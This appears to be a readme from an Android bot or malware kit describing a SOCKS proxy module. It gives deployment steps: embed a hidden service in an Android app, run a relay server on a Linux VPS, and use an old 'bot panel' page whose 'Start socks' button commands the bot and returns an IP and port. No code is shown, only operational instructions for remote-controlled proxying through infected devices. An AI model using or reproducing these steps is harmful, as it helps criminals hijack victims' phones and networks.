
Android socks module readme


android_service/

service you need to embed into your Android application
just put socks/ folder in the root of your sources and add <service> record into AndroidManifest.xml

Service starts by command from admin panel

linux_server/

	evserver_release/ - example of builded server, just upload it on the linux vps and execute "./evserver start"
						See "service" file for details

	evserver_source/ - sources of the server with test python scripts
	
php_panel_example/

	all files from the old bot panel, that was using the socks function.
	It works well in the old panel.
	
	>> You just need to open "Socks" page and click "Start socks" button to send command to the bot that starts socks.
	Then you will get ip and port. -- that's how it worked in the old panel.
